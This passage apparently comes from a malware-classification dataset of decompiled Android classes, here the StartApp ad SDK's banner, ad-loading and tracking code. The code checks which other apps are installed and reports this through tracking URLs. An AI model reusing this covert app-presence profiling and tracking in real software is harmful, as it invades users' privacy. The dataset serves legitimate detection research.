(readInt4 > 0) {       this.faces=new Banner3DFace[readInt4];       for (int i=0; i < readInt4; i++) {         this.faces[i]=(Banner3DFace)parcel.readParcelable(Banner3DFace.class.getClassLoader());       }     }     this.overrides=(AdInformationOverrides)parcel.readParcelable(AdInformationOverrides.class.getClassLoader());   }   SavedState(  Parcelable parcelable){     super(parcelable);   }   @Override public int describeContents(){     return 0;   }   public int getCurrentImage(){     return this.currentImage;   }   public List<AdDetails> getDetails(){     return Arrays.asList(this.details);   }   public float getRotation(){     return this.rotation;   }   public void setCurrentImage(  int i){     this.currentImage=i;   }   public void setDetails(  List<AdDetails> list){     this.details=new AdDetails[list.size()];     int i=0;     while (true) {       int i2=i;       if (i2 >= list.size()) {         return;       }       this.details[i2]=list.get(i2);       i=i2 + 1;     }   }   public void setRotation(  float f){     this.rotation=f;   }   @Override public void writeToParcel(  Parcel parcel,  int i){     super.writeToParcel(parcel,i);     if (!this.bIsVisible) {       parcel.writeInt(0);       return;     }     parcel.writeInt(1);     parcel.writeInt(this.currentImage);     parcel.writeFloat(this.rotation);     parcel.writeParcelableArray(this.details,i);     parcel.writeInt(this.loaded ? 1 : 0);     parcel.writeInt(this.loading ? 1 : 0);     parcel.writeInt(this.bDefaultLoad ? 1 : 0);     parcel.writeInt(this.faces.length);     for (int i2=0; i2 < this.faces.length; i2++) {       parcel.writeParcelable(this.faces[i2],i);     }     parcel.writeParcelable(this.overrides,i);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.banner.bannerstandard\BannerStandard.code","public class BannerStandard extends RelativeLayout implements AdEventListener {   private static final int ID_WEBVIEW=159868225;   private static final String TAG=""StartAppWall.BannerHtml"";   private static final int TIMEOUT_RESTART=50;   private static final int TIMEOUT_SMART_REDIRECT=5000;   private b adHtml;   private RelativeLayout adInformationContatiner;   private com.startapp.android.publish.adinformation.b adInformationLayout;   private AdPreferences adPreferences;   private boolean defaultLoad;   private boolean loaded;   private BannerOptions options;   private String prevAdId;   private boolean sentImpression;   private a size;   private Timer t;   private Task task;   private boolean visible;   private WebView webView; private class MyWebViewClient extends WebViewClient {     private MyWebViewClient(){     }     @Override public boolean shouldOverrideUrlLoading(    WebView webView,    String str){       if (BannerStandard.this.adHtml.getSmartRedirect(0)) {         p.a(BannerStandard.this.getContext(),str,5000);       }  else {         Intent intent=new Intent(""android.intent.action.VIEW"");         intent.setData(Uri.parse(str));         BannerStandard.this.getContext().startActivity(intent);       }       BannerStandard.this.webView.stopLoading();       return false;     }   } public class Task extends TimerTask {     private Task(){     }     @Override public void run(){       BannerStandard.this.post(new Runnable(){         @Override public void run(){           if (BannerStandard.this.isShown()) {             i.a(3,""StartAppWall.BannerHtmlREFRESH"");             BannerStandard.this.reload();           }         }       } );     }   }   public BannerStandard(  Context context){     super(context);     this.webView=new WebView(getContext());     this.prevAdId="""";     this.loaded=false;     this.defaultLoad=true;     this.visible=true;     this.sentImpression=false;     this.options=new BannerOptions();     this.adInformationLayout=null;     this.adInformationContatiner=null;     this.adPreferences=new AdPreferences();     this.size=new a(AdException.INVALID_REQUEST,50);     this.t=new Timer();     this.task=new Task();     init();   }   public BannerStandard(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.webView=new WebView(getContext());     this.prevAdId="""";     this.loaded=false;     this.defaultLoad=true;     this.visible=true;     this.sentImpression=false;     this.options=new BannerOptions();     this.adInformationLayout=null;     this.adInformationContatiner=null;     this.adPreferences=new AdPreferences();     this.size=new a(AdException.INVALID_REQUEST,50);     this.t=new Timer();     this.task=new Task();     init();   }   public BannerStandard(  Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);     this.webView=new WebView(getContext());     this.prevAdId="""";     this.loaded=false;     this.defaultLoad=true;     this.visible=true;     this.sentImpression=false;     this.options=new BannerOptions();     this.adInformationLayout=null;     this.adInformationContatiner=null;     this.adPreferences=new AdPreferences();     this.size=new a(AdException.INVALID_REQUEST,50);     this.t=new Timer();     this.task=new Task();     init();   }   public BannerStandard(  Context context,  boolean z){     super(context);     this.webView=new WebView(getContext());     this.prevAdId="""";     this.loaded=false;     this.defaultLoad=true;     this.visible=true;     this.sentImpression=false;     this.options=new BannerOptions();     this.adInformationLayout=null;     this.adInformationContatiner=null;     this.adPreferences=new AdPreferences();     this.size=new a(AdException.INVALID_REQUEST,50);     this.t=new Timer();     this.task=new Task();     this.defaultLoad=z;     init();   }   public BannerStandard(  Context context,  boolean z,  AdPreferences adPreferences){     super(context);     this.webView=new WebView(getContext());     this.prevAdId="""";     this.loaded=false;     this.defaultLoad=true;     this.visible=true;     this.sentImpression=false;     this.options=new BannerOptions();     this.adInformationLayout=null;     this.adInformationContatiner=null;     this.adPreferences=new AdPreferences();     this.size=new a(AdException.INVALID_REQUEST,50);     this.t=new Timer();     this.task=new Task();     this.defaultLoad=z;     this.adPreferences=adPreferences;     init();   }   private void addAdInformationLayout(){     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(getSuggestedMinimumWidth(),getSuggestedMinimumHeight());     layoutParams.addRule(13);     if (this.adInformationLayout == null && this.adInformationContatiner == null) {       this.adInformationContatiner=new RelativeLayout(getContext());       this.adInformationLayout=new com.startapp.android.publish.adinformation.b(getContext(),b.EnumC0051b.SMALL,AdPreferences.Placement.INAPP_BANNER,this.adHtml.getAdInfoOverride());       this.adInformationLayout.a(this.adInformationContatiner);     }     try {       ViewGroup viewGroup=(ViewGroup)this.adInformationContatiner.getParent();       if (viewGroup != null) {         viewGroup.removeView(this.adInformationContatiner);       }     }  catch (    Exception e) {     }     addView(this.adInformationContatiner,layoutParams);   }   private Point getApplicationSize(){     Point point=new Point();     Context context=getContext();     if (context instanceof Activity) {       View decorView=((Activity)context).getWindow().getDecorView();       try {         View view=(View)getParent();         if (view instanceof Banner) {           view=(View)view.getParent();         }         point.x=o.b(getContext(),((view.getMeasuredWidth() - view.getPaddingLeft()) - view.getPaddingRight()) + 1);         point.y=o.b(getContext(),((view.getMeasuredHeight() - view.getPaddingBottom()) - view.getPaddingTop()) + 1);       }  catch (      Exception e) {         point.x=o.b(getContext(),decorView.getMeasuredWidth());         point.y=o.b(getContext(),decorView.getMeasuredHeight());       }     }  else {       WindowManager windowManager=(WindowManager)getContext().getSystemService(""window"");       point.x=AdException.INVALID_REQUEST;       point.y=50;       if (windowManager != null && context != null) {         c.a(context,windowManager,point);       }     }     i.a(3,""StartAppWall.BannerHtml============ exit Application Size ["" + point.x + "",""+ point.y+ ""] ========="");     return point;   }   private void init(){     if (isInEditMode()) {       setMinimumWidth(o.a(getContext(),AdException.INVALID_REQUEST));       setMinimumHeight(o.a(getContext(),50));       setBackgroundColor(Color.rgb(169,169,169));       TextView textView=new TextView(getContext());       textView.setText(""StartApp Standard Banner"");       textView.setTextColor(-16777216);       RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);       layoutParams.addRule(13);       addView(textView,layoutParams);       return;     }     this.adHtml=new com.startapp.android.publish.a.b(getContext());     this.webView.setId(ID_WEBVIEW);     setVisibility(8);     this.webView.setBackgroundColor(0);     this.webView.setHorizontalScrollBarEnabled(false);     this.webView.getSettings().setJavaScriptEnabled(true);     this.webView.setVerticalScrollBarEnabled(false);     this.webView.setOnTouchListener(new View.OnTouchListener(){       @Override public boolean onTouch(      View view,      MotionEvent motionEvent){         return motionEvent.getAction() == 2;       }     } );     this.options=MetaData.INSTANCE.getBannerOption(getContext());     postDelayed(new Runnable(){       @Override public void run(){         i.a(3,""StartAppWall.BannerHtmlInitializing BannerHtml"");         int a=o.a(BannerStandard.this.getContext(),BannerStandard.this.size.a());         int a2=o.a(BannerStandard.this.getContext(),BannerStandard.this.size.b());         BannerStandard.this.setMinimumWidth(a);         BannerStandard.this.setMinimumHeight(a2);         BannerStandard.this.webView.addJavascriptInterface(new JsInterface(BannerStandard.this.getContext(),new Runnable(){           @Override public void run(){           }         } ),""startappwall"");         BannerStandard.this.webView.setWebViewClient(new MyWebViewClient());         if (BannerStandard.this.loaded) {           i.a(3,""StartAppWall.BannerHtmlBannerHTML already Loaded"");           BannerStandard.this.onReceiveAd(BannerStandard.this.adHtml);         }  else         if (BannerStandard.this.defaultLoad) {           BannerStandard.this.load();         }         BannerStandard.this.addView(BannerStandard.this.webView,new RelativeLayout.LayoutParams(a,a2));       }     } ,50L);   }   private void loadHtml(){     p.a(this.webView,this.adHtml.getHtml());   }   private void makeImpression(){     if (this.sentImpression || !this.visible) {       return;     }     String a=p.a(this.adHtml.getHtml(),""@tracking@"",""@tracking@"");     if (a == null) {       i.a(6,""StartAppWall.BannerHtmlError while trying to send tracking URL"");       return;     }     i.a(3,""StartAppWall.BannerHtmlSend Tracking URL: ["" + a + ""]"");     p.a(getContext(),a);     this.sentImpression=true;   }   public void reload(){     i.a(3,""StartAppWall.BannerHtmlLoading from network"");     removeView(this.adInformationContatiner);     this.sentImpression=false;     if (this.adPreferences == null) {       this.adPreferences=new AdPreferences();     }     Point applicationSize=getApplicationSize();     this.adHtml.setState(Ad.AdState.UN_INITIALIZED);     this.adHtml.setSize(applicationSize.x,applicationSize.y);     this.adHtml.load(this.adPreferences,this);   }   private void setSize(  int i,  int i2){     Point applicationSize=getApplicationSize();     if (applicationSize.x < i || applicationSize.y < i2) {       Point point=new Point(0,0);       ViewGroup.LayoutParams layoutParams=this.webView.getLayoutParams();       if (layoutParams == null) {         layoutParams=new RelativeLayout.LayoutParams(point.x,point.y);       }  else {         layoutParams.width=point.x;         layoutParams.height=point.y;       }       this.webView.setLayoutParams(layoutParams);       return;     }     this.size.a(i,i2);     int a=o.a(getContext(),this.size.a());     int a2=o.a(getContext(),this.size.b());     setMinimumWidth(a);     setMinimumHeight(a2);     ViewGroup.LayoutParams layoutParams2=this.webView.getLayoutParams();     if (layoutParams2 == null) {       layoutParams2=new RelativeLayout.LayoutParams(a,a2);     }  else {       layoutParams2.width=a;       layoutParams2.height=a2;     }     this.webView.setLayoutParams(layoutParams2);   }   public void hideBanner(){     this.visible=false;     setVisibility(8);   }   public void load(){     if (this.task != null) {       this.task.cancel();       this.task=new Task();     }     this.t.scheduleAtFixedRate(this.task,this.options.g(),this.options.g());     reload();   }   @Override public void onFailedToReceiveAd(  Ad ad){   }   @Override public void onReceiveAd(  Ad ad){     i.a(3,""StartAppWall.BannerHtmlHtml Ad Recievied OK"");     addAdInformationLayout();     if (this.adHtml.getHtml() == null || this.adHtml.getHtml().compareTo("""") == 0) {       i.a(6,""StartAppWall.BannerHtmlNo Banner recieved"");     }  else {       String a=p.a(this.adHtml.getHtml(),""@adId@"",""@adId@"");       if (a == null || this.prevAdId.compareTo(a) != 0) {         this.loaded=true;         this.prevAdId=a;         loadHtml();         try {           setSize(Integer.parseInt(p.a(this.adHtml.getHtml(),""@width@"",""@width@"")),Integer.parseInt(p.a(this.adHtml.getHtml(),""@height@"",""@height@"")));         }  catch (        NumberFormatException e) {           i.a(6,""StartAppWall.BannerHtmlError Casting width & height from HTML"");         }         makeImpression();       }     }     if (this.loaded) {       if (this.visible) {         setVisibility(0);       }       i.a(3,""StartAppWall.BannerHtmlDone Loading HTML Banner"");     }   }   public void showBanner(){     this.visible=true;     setVisibility(0);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.banner.bannerstandard\MyWebViewClient.code","private class MyWebViewClient extends WebViewClient {   private MyWebViewClient(){   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  String str){     if (BannerStandard.this.adHtml.getSmartRedirect(0)) {       p.a(BannerStandard.this.getContext(),str,5000);     }  else {       Intent intent=new Intent(""android.intent.action.VIEW"");       intent.setData(Uri.parse(str));       BannerStandard.this.getContext().startActivity(intent);     }     BannerStandard.this.webView.stopLoading();     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.banner.bannerstandard\Task.code","public class Task extends TimerTask {   private Task(){   }   @Override public void run(){     BannerStandard.this.post(new Runnable(){       @Override public void run(){         if (BannerStandard.this.isShown()) {           i.a(3,""StartAppWall.BannerHtmlREFRESH"");           BannerStandard.this.reload();         }       }     } );   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.c\a.code","public class a extends AsyncTask<Void,Void,Boolean> {   private List<com.startapp.android.publish.a> a;   private Context b;   private List<String> c=new ArrayList();   public a(  Context context,  List<com.startapp.android.publish.a> list){     this.a=list;     this.b=context;   }   private List<String> a(  List<String> list,  String str,  String str2){     ArrayList arrayList=new ArrayList();     for (int i=0; i <= list.size() / 5; i++) {       int i2=i * 5;       int i3=(i * 5) + 5;       if (i3 > list.size()) {         i3=list.size();       }       arrayList.add(""http://www.startappexchange.com/tracking/adImpression?"" + TextUtils.join(""&"",list.subList(i2,i3)) + ""&isShown=""+ str+ ""&appPresence=""+ str2);     }     com.startapp.android.publish.e.i.a(3,""newUrlList size = "" + arrayList.size());     return arrayList;   }   private void a(){     b();     int i=0;     while (true) {       int i2=i;       if (i2 >= this.c.size()) {         return;       }       String str=this.c.get(i2);       if (str.length() != 0) {         p.a(this.b,str);       }       i=i2 + 1;     }   }   private void b(){     com.startapp.android.publish.e.i.a(3,""in getDParameter()"");     ArrayList arrayList=new ArrayList();     ArrayList arrayList2=new ArrayList();     for (    com.startapp.android.publish.a aVar : this.a) {       if (!aVar.c()) {         String str=aVar.a().split(""tracking/adImpression[?]d="")[1];         if (aVar.d()) {           arrayList.add(""d="" + str);         }  else {           arrayList2.add(""d="" + str);         }       }     }     com.startapp.android.publish.e.i.a(3,""appPresence tracking size = "" + arrayList.size() + ""normal size = ""+ arrayList2.size());     if (!arrayList.isEmpty()) {       this.c.addAll(a(arrayList,""false"",""true""));     }     if (arrayList2.isEmpty()) {       return;     }     this.c.addAll(a(arrayList2,""false"",""false""));   }   @Override public Boolean doInBackground(  Void... voidArr){     com.startapp.android.publish.e.i.a(3,""in doInBackground handler"");     a();     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.c\b.code","public abstract class b extends d {   private Set<String> g;   private List<com.startapp.android.publish.a> h;   private int i;   private Handler j;   public b(  Context context,  Ad ad,  AdPreferences adPreferences,  AdEventListener adEventListener,  AdPreferences.Placement placement){     super(context,ad,adPreferences,adEventListener,placement);     this.g=new HashSet();     this.h=new ArrayList();     this.i=0;     this.j=new Handler();   }   private Boolean a(  List<com.startapp.android.publish.a> list){     boolean z=false;     for (    com.startapp.android.publish.a aVar : list) {       boolean startsWith=aVar.b().startsWith(""!"");       boolean a=a(this.a,startsWith ? aVar.b().substring(1) : aVar.b(),aVar.e());       if ((!startsWith && a) || (startsWith && !a)) {         com.startapp.android.publish.e.i.a(3,""in isAppPresent, skipAd is true"");         aVar.b(a);         z=this.i == 0;         if (z && !startsWith) {           this.g.add(aVar.b());         }  else         if (!z && aVar.a() != null) {           aVar.a(aVar.a() + ""&isShown="" + aVar.c()+ ""&appPresence=""+ aVar.d());         }       }       this.h.add(aVar);     }     if (z) {       for (int i=0; i < this.h.size(); i++) {         this.h.get(i).a(false);       }     }     return Boolean.valueOf(z);   }   private List<com.startapp.android.publish.a> b(  String str){     ArrayList arrayList=new ArrayList();     String[] strArr=new String[0];     String a=p.a(str,""@tracking@"",""@tracking@"");     if (a != null) {       strArr=a.split("","");     }     String[] strArr2=new String[0];     String a2=p.a(str,""@appPresencePackage@"",""@appPresencePackage@"");     if (a2 != null) {       strArr2=a2.split("","");     }     String[] strArr3=new String[0];     String a3=p.a(str,""@minAppVersion@"",""@minAppVersion@"");     if (a3 != null) {       strArr3=a3.split("","");     }     int i=0;     while (i < strArr2.length) {       arrayList.add(new com.startapp.android.publish.a(strArr.length > i ? strArr[i] : null,strArr2[i],this.i,strArr3.length > i ? Integer.valueOf(strArr3[i]).intValue() : 0));       i++;     }     while (i < strArr.length) {       arrayList.add(new com.startapp.android.publish.a(strArr[i],"""",this.i,strArr3.length > i ? Integer.valueOf(strArr3[i]).intValue() : 0));       i++;     }     return arrayList;   }   @Override protected Object a(){     GetAdRequest c=c();     if (this.g.size() == 0) {       this.g.add(this.a.getPackageName());     }     c.setPackagesExclude(this.g);     if (this.i > 0) {       c.setEngInclude(false);       if (MetaData.INSTANCE.getAdInformationConfig(this.a).e().a(this.a)) {         p.b(this.a);       }     }     try {       return com.startapp.android.publish.d.b.a(this.a,com.startapp.android.publish.b.a(b.a.HTML),c,null);     }  catch (    com.startapp.android.publish.e.n e) {       com.startapp.android.publish.e.i.a(6,""Unable to handle GetHtmlAdService command!!!!"",e);       this.f=e.getMessage();       return null;     }   }   @Override public void onPostExecute(  Boolean bool){     super.onPostExecute(bool);     com.startapp.android.publish.e.i.a(4,""Html onPostExecute, result=["" + bool + ""]"");     a(bool.booleanValue(),true);   }   protected void a(  boolean z,  boolean z2){     if (!z) {       com.startapp.android.publish.e.i.a(6,""Html onPostExecute failed error=["" + this.f + ""]"");       if (this.d != null) {         this.d.onFailedToReceiveAd(this.b);         return;       }       return;     }     if (z2) {       final WebView webView=new WebView(this.a);       webView.setWebChromeClient(new WebChromeClient());       webView.setWebViewClient(new WebViewClient(){         @Override public void onPageFinished(        WebView webView2,        String str){           super.onPageFinished(webView2,str);           com.startapp.android.publish.e.i.a(4,""onPageFinished url=["" + str + ""]"");           b.this.j.removeCallbacksAndMessages(null);           b.this.j.post(new Runnable(){             @Override public void run(){               if (b.this.d != null) {                 b.this.d.onReceiveAd(b.this.b);               }             }           } );         }         @Override public void onReceivedError(        final WebView webView2,        int i,        final String str,        String str2){           super.onReceivedError(webView2,i,str,str2);           com.startapp.android.publish.e.i.a(6,""onReceivedError failingUrl=["" + str2 + ""], description=[""+ str+ ""]"");           b.this.j.removeCallbacksAndMessages(null);           b.this.j.post(new Runnable(){             @Override public void run(){               webView2.destroy();               b.this.b.setErrorMessage(str);               if (b.this.d != null) {                 b.this.d.onFailedToReceiveAd(b.this.b);               }             }           } );         }         @Override public boolean shouldOverrideUrlLoading(        WebView webView2,        String str){           com.startapp.android.publish.e.i.a(4,""shouldOverrideUrlLoading url=["" + str + ""]"");           return super.shouldOverrideUrlLoading(webView2,str);         }       } );       p.a(webView,((com.startapp.android.publish.a.d)this.b).getHtml());       this.j.postDelayed(new Runnable(){         @Override public void run(){           webView.destroy();           if (b.this.d != null) {             b.this.d.onReceiveAd(b.this.b);           }         }       } ,10000L);       return;     }     if (this.d != null) {       if (z) {         this.d.onReceiveAd(this.b);       }  else {         this.d.onFailedToReceiveAd(this.b);       }     }   }   @Override protected boolean a(  Object obj){     com.startapp.android.publish.e.i.a(4,""Handle Html Response"");     String str=(String)obj;     if (TextUtils.isEmpty(str)) {       if (this.f == null) {         this.f=""Empty Ad"";       }       return false;     }     if (a(b(str)).booleanValue()) {       return b();     }     ((com.startapp.android.publish.a.d)this.b).apps=this.h;     return a(str);   }   protected boolean a(  String str){     ((com.startapp.android.publish.a.d)this.b).setHtml(str);     return true;   }   protected boolean b(){     com.startapp.android.publish.e.i.a(3,""At least one package is present. sending another request to AdPlatform"");     this.i++;     new a(this.a,this.h).execute(new Void[0]);     return doInBackground(new Void[0]).booleanValue();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.c\c.code","public abstract class c extends d {   private int g;   private Set<String> h;   private List<com.startapp.android.publish.a> i;   private ArrayList<String> j;   public c(  Context context,  Ad ad,  AdPreferences adPreferences,  AdEventListener adEventListener,  AdPreferences.Placement placement){     super(context,ad,adPreferences,adEventListener,placement);     this.g=0;     this.h=new HashSet();     this.i=new ArrayList();     this.j=new ArrayList<>();   }   private boolean b(){     this.g++;     return doInBackground(new Void[0]).booleanValue();   }   private void d(){     int i=0;     while (true) {       int i2=i;       if (i2 >= this.i.size()) {         return;       }       if (this.i.get(i2).a() != null && this.i.get(i2).d()) {         this.i.get(i2).a(this.i.get(i2).a() + ""&isShown="" + this.i.get(i2).c()+ ""&appPresence=""+ this.i.get(i2).d());       }       i=i2 + 1;     }   }   @Override protected Object a(){     GetAdRequest c=c();     if (this.h.size() == 0) {       this.h.add(this.a.getPackageName());     }     if (this.g > 0) {       c.setEngInclude(false);     }     c.setPackagesExclude(this.h);     c.setEngInclude(this.g == 0);     try {       return (GetAdResponse)com.startapp.android.publish.d.b.a(this.a,com.startapp.android.publish.b.a(b.a.JSON),c,(Map<String,String>)null,GetAdResponse.class);     }  catch (    com.startapp.android.publish.e.n e) {       com.startapp.android.publish.e.i.a(""AppPresence"",6,""Unable to handle GetAdsSetService command!!!!"",e);       this.f=e.getMessage();       return null;     }   }   protected List<AdDetails> a(  List<AdDetails> list){     boolean z;     ArrayList arrayList=new ArrayList();     ArrayList arrayList2=new ArrayList();     ArrayList arrayList3=new ArrayList();     com.startapp.android.publish.e.i.a(""AppPresence"",3,""in isAppPresent"");     boolean z2=false;     for (    AdDetails adDetails : list) {       com.startapp.android.publish.a aVar=new com.startapp.android.publish.a(adDetails.getTrackingUrl(),adDetails.getAppPresencePackage(),this.g,adDetails.getMinAppVersion());       boolean startsWith=adDetails.getAppPresencePackage().startsWith(""!"");       boolean a=a(this.a,startsWith ? adDetails.getAppPresencePackage().substring(1) : adDetails.getAppPresencePackage(),adDetails.getMinAppVersion());       if ((a && !startsWith) || (!a && startsWith)) {         aVar.b(a);         aVar.a(false);         if (!startsWith) {           arrayList2.add(adDetails);         }         arrayList3.add(aVar);         this.j.add(adDetails.getPackageName());         this.i.add(aVar);         this.h.add(adDetails.getPackageName());         com.startapp.android.publish.e.i.a(""AppPresence"",3,""App Presence:["" + adDetails.getPackageName() + ""]"");         z=true;       }  else {         arrayList.add(adDetails);         this.i.add(aVar);         com.startapp.android.publish.e.i.a(""AppPresence"",3,""App Not Presence:["" + adDetails.getPackageName() + ""]"");         z=z2;       }       z2=z;     }     if (z2) {       p.b(this.a);       new a(this.a,this.i).execute(new Void[0]);     }     if (arrayList.size() < 5 && (list.size() != 1 || this.g > 0)) {       int min=Math.min(5 - arrayList.size(),arrayList2.size());       arrayList.addAll(arrayList2.subList(0,min));       for (int i=0; i < min; i++) {         ((com.startapp.android.publish.a)arrayList3.get(i)).a(true);       }       this.i.addAll(arrayList3);     }     return arrayList;   }   protected abstract void a(  Ad ad);   @Override public void onPostExecute(  Boolean bool){     super.onPostExecute(bool);     if (bool.booleanValue()) {       a(this.b);       if (this.d != null) {         this.d.onReceiveAd(this.b);       }     }   }   @Override protected boolean a(  Object obj){     GetAdResponse getAdResponse=(GetAdResponse)obj;     if (obj == null) {       this.f=""Empty Response"";       com.startapp.android.publish.e.i.a(""AppPresence"",6,""Error Empty Response"");       return false;     }     if (!getAdResponse.isValidResponse()) {       this.f=getAdResponse.getErrorMessage();       com.startapp.android.publish.e.i.a(""AppPresence"",6,""Error msg = ["" + this.f + ""]"");       return false;     }     com.startapp.android.publish.a.f fVar=(com.startapp.android.publish.a.f)this.b;     List<AdDetails> a=a(getAdResponse.getAdsDetails());     d();     fVar.a(a);     fVar.setAdInfoOverride(getAdResponse.getAdInfoOverride());     ((com.startapp.android.publish.a.f)this.b).a=this.i;     boolean z=getAdResponse.getAdsDetails() != null && getAdResponse.getAdsDetails().size() > 0;     if (!z) {       this.f=""Empty Response"";     }     if (a.size() != 0 || this.g != 0) {       return z;     }     com.startapp.android.publish.e.i.a(""AppPresence"",3,""Packages exists - another request"");     return b();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.c\d.code","public abstract class d extends AsyncTask<Void,Void,Boolean> {   protected final Context a;   protected final Ad b;   protected final AdPreferences c;   protected final AdEventListener d;   protected AdPreferences.Placement e;   protected String f=null;   public d(  Context context,  Ad ad,  AdPreferences adPreferences,  AdEventListener adEventListener,  AdPreferences.Placement placement){     this.a=context;     this.b=ad;     this.c=adPreferences;     this.d=adEventListener;     this.e=placement;   }   public static boolean a(  Context context,  String str,  int i){     try {       return context.getPackageManager().getPackageInfo(str,android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS).versionCode >= i;     }  catch (    PackageManager.NameNotFoundException e) {       return false;     }   }   @Override public Boolean doInBackground(  Void... voidArr){     return Boolean.valueOf(a(a()));   }   protected abstract Object a();   @Override public void onPostExecute(  Boolean bool){     super.onPostExecute(bool);     this.b.setState(bool.booleanValue() ? Ad.AdState.READY : Ad.AdState.UN_INITIALIZED);     if (bool.booleanValue()) {       return;     }     this.b.setErrorMessage(this.f);     if (this.d != null) {       this.d.onFailedToReceiveAd(this.b);     }   }   protected abstract boolean a(  Object obj);   public GetAdRequest c(){     GetAdRequest getAdRequest=new GetAdRequest();     getAdRequest.fillApplicationDetails(this.a,this.c);     getAdRequest.fillAdPreferences(this.c,this.e,p.c(this.a));     return getAdRequest;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.c\e.code","public class e extends c {   public e(  Context context,  com.startapp.android.publish.a.a aVar,  AdPreferences adPreferences,  AdEventListener adEventListener){     super(context,aVar,adPreferences,adEventListener,AdPreferences.Placement.INAPP_BANNER);   }   @Override protected void a(  Ad ad){   }   @Override public GetAdRequest c(){     GetAdRequest c=super.c();     c.setAdsNumber(MetaData.INSTANCE.getBannerOption(this.a).f());     return c;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.c\f.code","public class f extends b {   private int g;   public f(  Context context,  com.startapp.android.publish.a.d dVar,  int i,  AdPreferences adPreferences,  AdEventListener adEventListener){     super(context,dVar,adPreferences,adEventListener,AdPreferences.Placement.INAPP_BANNER);     this.g=0;     this.g=i;   }   @Override public void onPostExecute(  Boolean bool){     super.onPostExecute(bool);     com.startapp.android.publish.e.i.a(4,""Html onPostExecute, result=["" + bool + ""]"");     if (this.d != null) {       if (bool != null) {         this.d.onReceiveAd(this.b);       }  else {         this.d.onFailedToReceiveAd(this.b);       }     }   }   @Override protected boolean a(  String str){     ((com.startapp.android.publish.a.d)this.b).setHtml(str);     return true;   }   @Override public GetAdRequest c(){     com.startapp.android.publish.a.d dVar=(com.startapp.android.publish.a.d)this.b;     GetAdRequest c=super.c();     c.setWidth(dVar.getWidth());     c.setHeight(dVar.getHeight());     c.setOffset(this.g);     return c;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.c\g.code","public class g extends b {   public g(  Context context,  com.startapp.android.publish.a.d dVar,  AdPreferences adPreferences,  AdEventListener adEventListener){     super(context,dVar,adPreferences,adEventListener,AdPreferences.Placement.INAPP_FULL_SCREEN);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.c\h.code","public class h extends AsyncTask<Void,Void,Boolean> {   private static boolean e=false;   private static boolean f=false;   private final Context a;   private final AdPreferences b;   private final o c;   private MetaDataResponse d=null;   public h(  Context context,  AdPreferences adPreferences,  o oVar){     this.a=context;     this.b=adPreferences;     this.c=oVar;   }   @Override public Boolean doInBackground(  Void... voidArr){     com.startapp.android.publish.e.i.a(3,""Loading MetaData"");     if (e) {       com.startapp.android.publish.e.i.a(3,""Waiting MetaData"");       try {         Thread.sleep(1000L);       }  catch (      InterruptedException e2) {         e2.printStackTrace();       }       if (f) {         return false;       }       return doInBackground(voidArr);     }     e=true;     MetaDataRequest metaDataRequest=new MetaDataRequest();     metaDataRequest.fillApplicationDetails(this.a,this.b);     try {       com.startapp.android.publish.e.i.a(3,""Networking MetaData"");       this.d=(MetaDataResponse)com.startapp.android.publish.d.b.a(this.a,com.startapp.android.publish.b.a(b.a.METADATA),metaDataRequest,(Map<String,String>)null,MetaDataResponse.class);       f=true;       return Boolean.TRUE;     }  catch (    com.startapp.android.publish.e.n e3) {       com.startapp.android.publish.e.i.a(6,""Unable to handle GetHtmlAdService command!!!!"",e3);       e=false;       return Boolean.FALSE;     }   }   @Override public void onPostExecute(  Boolean bool){     super.onPostExecute(bool);     if (bool.booleanValue() && this.d != null && this.a != null) {       MetaData.INSTANCE.init(this.a,this.d);     }     if (this.c != null) {       this.c.onFinishLoadingMeta();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.c\i.code","public class i extends c {   private NativeAdPreferences g;   public i(  Context context,  Ad ad,  AdPreferences adPreferences,  AdEventListener adEventListener,  NativeAdPreferences nativeAdPreferences){     super(context,ad,adPreferences,adEventListener,AdPreferences.Placement.INAPP_NATIVE);     this.g=nativeAdPreferences;   }   @Override protected void a(  Ad ad){   }   @Override public GetAdRequest c(){     GetAdRequest c=super.c();     c.setAdsNumber(this.g.getAdsNumber());     c.setWidth(this.g.getImageSize().getWidth());     c.setHeight(this.g.getImageSize().getHeight());     return c;   } } "
